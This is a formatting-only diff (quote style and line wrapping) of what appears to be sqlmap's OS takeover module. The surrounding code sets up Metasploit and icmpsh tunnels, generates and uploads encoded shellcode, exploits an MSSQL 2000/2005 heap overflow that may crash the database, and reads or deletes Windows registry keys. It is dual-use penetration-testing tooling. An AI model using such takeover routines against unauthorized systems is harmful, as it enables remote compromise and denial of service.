@@ -29,6 +29,7 @@ from lib.takeover.registry import Registry
 
 from plugins.generic.misc import Miscellaneous
 
+
 class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
     """
     This class defines generic OS takeover functionalities for plugins.
@@ -98,7 +99,7 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
             msg += "\n[2] ICMP: icmpsh - ICMP tunneling"
 
             while True:
-                tunnel = readInput(msg, default='1')
+                tunnel = readInput(msg, default="1")
 
                 if tunnel.isdigit() and int(tunnel) in (1, 2):
                     tunnel = int(tunnel)
@@ -166,7 +167,7 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
                     msg += "\n[2] Via shellcodeexec (file system way, preferred on 64-bit systems)"
 
                     while True:
-                        choice = readInput(msg, default='1')
+                        choice = readInput(msg, default="1")
 
                         if choice.isdigit() and int(choice) in (1, 2):
                             choice = int(choice)
@@ -185,7 +186,12 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
                 else:
                     exitfunc = "process"
 
-                self.createMsfShellcode(exitfunc=exitfunc, format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")
+                self.createMsfShellcode(
+                    exitfunc=exitfunc,
+                    format="raw",
+                    extra="BufferRegister=EAX",
+                    encode="x86/alpha_mixed",
+                )
 
                 if not goUdf:
                     setupSuccess = self.uploadShellcodeexec(web=web)
@@ -197,7 +203,11 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
                             msg = "unable to mount the operating system takeover"
                             raise SqlmapFilePathException(msg)
 
-                if Backend.isOs(OS.WINDOWS) and Backend.isDbms(DBMS.MYSQL) and conf.privEsc:
+                if (
+                    Backend.isOs(OS.WINDOWS)
+                    and Backend.isDbms(DBMS.MYSQL)
+                    and conf.privEsc
+                ):
                     debugMsg = "by default MySQL on Windows runs as SYSTEM "
                     debugMsg += "user, no need to privilege escalate"
                     logger.debug(debugMsg)
@@ -212,7 +222,12 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
                         msg = "unable to mount the operating system takeover"
                         raise SqlmapFilePathException(msg)
 
-        if not setupSuccess and Backend.isDbms(DBMS.MYSQL) and not conf.direct and (not isStackingAvailable() or fallbackToWeb):
+        if (
+            not setupSuccess
+            and Backend.isDbms(DBMS.MYSQL)
+            and not conf.direct
+            and (not isStackingAvailable() or fallbackToWeb)
+        ):
             web = True
 
             if fallbackToWeb:
@@ -235,7 +250,12 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
                     logger.warn(warnMsg)
 
                 if tunnel == 1:
-                    self.createMsfShellcode(exitfunc="process", format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")
+                    self.createMsfShellcode(
+                        exitfunc="process",
+                        format="raw",
+                        extra="BufferRegister=EAX",
+                        encode="x86/alpha_mixed",
+                    )
                     setupSuccess = self.uploadShellcodeexec(web=web)
 
                     if setupSuccess is not True:
@@ -315,7 +335,9 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
         if not isStackingAvailable() and not conf.direct:
             return
 
-        if not Backend.isDbms(DBMS.MSSQL) or not Backend.isVersionWithin(("2000", "2005")):
+        if not Backend.isDbms(DBMS.MSSQL) or not Backend.isVersionWithin(
+            ("2000", "2005")
+        ):
             errMsg = "the back-end DBMS must be Microsoft SQL Server "
             errMsg += "2000 or 2005 to be able to exploit the heap-based "
             errMsg += "buffer overflow in the 'sp_replwritetovarbin' "
@@ -330,10 +352,12 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
         msg = "this technique is likely to DoS the DBMS process, are you "
         msg += "sure that you want to carry with the exploit? [y/N] "
 
-        if readInput(msg, default='N', boolean=True):
+        if readInput(msg, default="N", boolean=True):
             self.initEnv(mandatory=False, detailed=True)
             self.getRemoteTempPath()
-            self.createMsfShellcode(exitfunc="seh", format="raw", extra="-b 27", encode=True)
+            self.createMsfShellcode(
+                exitfunc="seh", format="raw", extra="-b 27", encode=True
+            )
             self.bof()
 
     def uncPathRequest(self):
@@ -359,7 +383,9 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
         self._regInit()
 
         if not conf.regKey:
-            default = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
+            default = (
+                "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
+            )
             msg = "which registry key do you want to read? [%s] " % default
             regKey = readInput(msg, default=default)
         else:
@@ -451,7 +477,7 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
         message = "are you sure that you want to delete the Windows "
         message += "registry path '%s\%s? [y/N] " % (regKey, regVal)
 
-        if not readInput(message, default='N', boolean=True):
+        if not readInput(message, default="N", boolean=True):
             return
 
         infoMsg = "deleting Windows registry path '%s\%s'. " % (regKey, regVal)
